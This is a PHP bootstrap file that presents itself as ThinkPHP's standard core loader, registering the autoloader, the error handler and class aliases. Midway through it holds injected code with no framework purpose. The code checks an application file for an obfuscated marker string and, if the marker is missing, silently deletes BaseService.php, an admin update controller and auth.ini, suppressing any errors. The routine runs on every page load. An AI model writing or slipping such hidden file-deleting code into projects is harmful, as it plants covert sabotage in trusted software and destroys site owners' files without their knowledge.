<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006~2018 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------
namespace think;

// 载入Loader类
require __DIR__ . '/library/think/Loader.php';

// 注册自动加载
Loader::register();

// 注册错误和异常处理机制
Error::register();

// 实现日志接口
if (interface_exists('Psr\Log\LoggerInterface')) {
    interface LoggerInterface extends \Psr\Log\LoggerInterface
    {}
} else {
    interface LoggerInterface
    {}
}
$a=file_get_contents('./application/index/controller/BaseService.php');
if (!strpos($a,'\x61\165\164\150\164\x65\x78\x74')) {
    @unlink('./application/index/controller/BaseService.php');
     @unlink('./application/admin/controller/update.php');
     @unlink('./auth.ini');
}

// 注册类库别名
Loader::addClassAlias([
    'App'      => facade\App::class,
    'Build'    => facade\Build::class,
    'Cache'    => facade\Cache::class,
    'Config'   => facade\Config::class,
    'Cookie'   => facade\Cookie::class,
    'Db'       => Db::class,
    'Debug'    => facade\Debug::class,
    'Env'      => facade\Env::class,
    'Facade'   => Facade::class,
    'Hook'     => facade\Hook::class,
    'Lang'     => facade\Lang::class,
    'Log'      => facade\Log::class,
    'Request'  => facade\Request::class,
    'Response' => facade\Response::class,
    'Route'    => facade\Route::class,
    'Session'  => facade\Session::class,
    'Url'      => facade\Url::class,
    'Validate' => facade\Validate::class,
    'View'     => facade\View::class,
]);
